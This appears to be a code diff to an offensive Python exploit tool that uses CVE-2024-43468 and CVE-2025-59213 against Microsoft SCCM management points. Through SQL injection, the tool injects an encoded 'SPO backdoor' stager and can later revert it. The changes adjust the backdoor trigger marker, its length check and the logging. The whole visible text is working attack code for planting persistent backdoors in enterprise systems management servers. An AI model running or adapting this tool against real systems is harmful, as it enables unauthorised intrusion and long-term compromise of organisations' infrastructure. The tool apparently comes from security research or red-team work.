@@ -93,7 +93,7 @@ END
         return self.__ccm_post(multipart_body)
 
     # MP_GetAssignedSite
-    def do_revert(self, marker='ABC'):
+    def do_revert(self, marker='RSA'):
         client_fqdn = f"{marker}:{b64encode(self.original_spo.encode()).decode()}"
         request_body = self.tpl_SiteInformationRequest.format(SITECODE=client_fqdn)
         request = b"%s\r\n" % request_body.encode('utf-16')[2:]
@@ -139,13 +139,13 @@ if __name__ == "__main__":
 
     cve_24 = subparsers.add_parser('CVE-2024-43468', help='Use CVE-2024-43468 to inject the SPO backdoor')
     cve_24.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
-    cve_24.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
+    cve_24.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help=f"Override marker to trigger the backdoor (Default: {default_marker})")
     cve_24.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
     cve_24.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")
 
     cve_25 = subparsers.add_parser('CVE-2025-59213', help='Use CVE-2025-59213 to inject the SPO backdoor')
     cve_25.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
-    cve_25.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
+    cve_25.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help=f"Override marker to trigger the backdoor (Default: {default_marker})")
     cve_25.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
     cve_25.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")
     cve_25.add_argument("-sk", "--sigkey", action="store", required=False, default=None, help="SMS signature key")
@@ -156,7 +156,7 @@ if __name__ == "__main__":
    
     revert_parser = subparsers.add_parser('revert', help="Revert the changes to the original SPO")
     revert_parser.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
-    revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
+    revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help=f"Override marker to trigger the backdoor (Default: {default_marker})")
     revert_parser.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
     revert_parser.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")
 
@@ -169,7 +169,12 @@ if __name__ == "__main__":
     else:
         logging.getLogger().setLevel(logging.INFO)
 
+    if len(args.marker) != 3:
+        print("[!] Error: Marker must be exactly 3 characters.")
+        exit()
+
     if args.command == 'revert':
+        print(f"[?] Attempting to revert the SQL backdoor.")
         SCCM_SQL_HTTP(args.target, args.key, args.cert, altAuth=args.altauth).do_revert(args.marker)
     else :
         try:
@@ -182,10 +187,9 @@ if __name__ == "__main__":
         payload = b64encode(gzip.compress(spo_stager.format(MARKER=args.marker).encode())).decode()        
         sql_inject_stager = tpl_inject_stager.format(PAYLOAD=payload)
 
+        print(f"[?] Attempting backdoor injection with exploit {args.command}")
+
         if args.command == 'CVE-2025-59213':
-            if len(args.marker) > 3:
-                print(f"[!] Error: Because of length constraints, the marker is limited to 3 characters.")
-                exit()
             exploit_module.SCCM(args.target, args.key, args.cert, args.sigkey, sql_inject_stager, altAuth=args.altauth, verbose=args.verbose).exploit(args.client_name, int(args.registration_sleep))
         else:
             exploit_module.SCCM(args.target, args.key, args.cert, altAuth=args.altauth).sqli_machineID(sql_inject_stager)
